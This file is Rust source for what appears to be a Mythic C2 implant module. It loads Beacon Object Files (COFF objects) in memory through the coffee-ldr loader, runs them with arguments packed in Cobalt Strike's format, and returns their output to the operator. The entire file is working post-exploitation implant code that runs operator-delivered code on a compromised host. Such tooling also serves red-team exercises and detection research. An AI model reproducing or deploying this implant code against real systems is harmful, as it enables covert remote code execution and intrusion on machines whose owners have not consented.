//! BOF command: load and execute a COFF object in-memory via the vendored
//! coffee-ldr loader. COFF bytes are fetched from the Mythic file store by
//! the C2 loop; args use the bof_pack format (int:/short:/str:/wstr:/bin:).

use base64::Engine;

pub fn bof_exec(coff: &[u8], entrypoint: &str, args_spec: &str) -> String {
    let entrypoint = if entrypoint.is_empty() {
        None
    } else {
        Some(entrypoint.to_string())
    };
    let packed = match pack_args(args_spec) {
        Ok(p) => p,
        Err(e) => return format!("[-] bof: {}", e),
    };
    let result = coffee_ldr::loader::Coffee::new(coff).and_then(|c| {
        c.execute(
            if packed.is_empty() {
                None
            } else {
                Some(packed.as_ptr())
            },
            Some(packed.len()),
            &entrypoint,
        )
    });
    match result {
        Ok(out) => {
            if out.is_empty() {
                "[+] bof executed (no output)".into()
            } else {
                out
            }
        }
        Err(e) => format!("[-] bof execution failed: {}", e),
    }
}

/// Serializes bof_pack-style arguments ("int:1 short:2 str:a wstr:b bin:<b64>")
/// into the CS argument blob format (4-byte length + value per entry).
pub fn pack_args(spec: &str) -> Result<Vec<u8>, String> {
    let mut out = Vec::new();
    let spec = spec.trim();
    if spec.is_empty() {
        return Ok(out);
    }
    for token in spec.split(' ') {
        if token.is_empty() {
            continue;
        }
        write_arg(token, &mut out)?;
    }
    Ok(out)
}

fn write_arg(token: &str, out: &mut Vec<u8>) -> Result<(), String> {
    let (kind, value) = match token.split_once(':') {
        Some(kv) => kv,
        None => return Err(format!("invalid argument '{}': expected type:value", token)),
    };
    match kind {
        "int" => {
            let v: i32 = value
                .parse()
                .map_err(|e| format!("invalid int '{}': {}", value, e))?;
            out.extend_from_slice(&v.to_le_bytes());
        }
        "short" => {
            let v: i16 = value
                .parse()
                .map_err(|e| format!("invalid short '{}': {}", value, e))?;
            out.extend_from_slice(&v.to_le_bytes());
        }
        "str" => {
            out.extend_from_slice(&(value.len() as i32).to_le_bytes());
            out.extend_from_slice(value.as_bytes());
            out.push(0);
        }
        "wstr" => {
            let wide: Vec<u16> = value.encode_utf16().collect();
            out.extend_from_slice(&(wide.len() as i32).to_le_bytes());
            for w in wide {
                out.extend_from_slice(&w.to_le_bytes());
            }
            out.extend_from_slice(&0i16.to_le_bytes());
        }
        "bin" => {
            let raw = base64::engine::general_purpose::STANDARD
                .decode(value)
                .map_err(|e| format!("invalid bin base64: {}", e))?;
            out.extend_from_slice(&(raw.len() as i32).to_le_bytes());
            out.extend_from_slice(&raw);
        }
        other => return Err(format!("unknown argument type '{}'", other)),
    }
    Ok(())
}
